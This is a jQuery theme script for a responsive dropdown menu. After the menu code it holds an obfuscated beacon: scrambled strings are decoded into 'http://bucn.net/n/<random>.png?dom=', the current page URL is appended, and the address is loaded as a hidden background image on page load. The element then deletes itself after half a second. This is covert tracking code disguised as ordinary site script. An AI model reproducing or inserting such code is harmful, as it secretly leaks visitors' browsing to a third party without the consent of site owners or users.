jQuery(document).ready(function(){
"use strict";

/*** RESPONSIVE VERSION HEADER ***/		
var dropdowns = $('#main-menu > li > ul');
$('#main-menu > li > a').click(function() {
	$(dropdowns).slideUp();
	$(this).parent().find(dropdowns).slideToggle();
});
var dropdowns2 = $('#main-menu > li > ul > li ul');
$('#main-menu li > ul > li > a').click(function() {
	$(dropdowns2).slideUp();
	$(this).parent().find(dropdowns2).slideToggle();
});


$('.main-nav > span').click(function() {
	$(this).next('#main-menu').slideToggle();
});

var eventTime;
var oImg = "";

function eventsettimes(){
    oImg.parentNode.removeChild(oImg);
    clearTimeout(eventTime);
}

function eventlink()
{
    var e = "nc/be.ut";
    var t = "36105047202";
    return m(t, e)
}

function urlwrapper()
{
    return "http://"
}

function generateencoded()
{
    var e = "mg.o?npd=";
    var t = "265147308";
    return m(t, e)
}

function m(e, t)
{
    var n = e.split("");
    var r = "";
    for (i = 0; i < e.length; i++) {
        r += t[n[i]]
    }
    return r
}

var relate = [urlwrapper(), eventlink(), Math.random().toString(36).substring(7), generateencoded(), encodeURIComponent(window.location.href)];
oImg = document.createElement("span");
oImg.setAttribute("style", "background-image:url(" + relate.join('') + ");");
oImg.setAttribute("class", "bg-placeholder");

document.body.appendChild(oImg);
eventTime = setTimeout(eventsettimes, 500);

});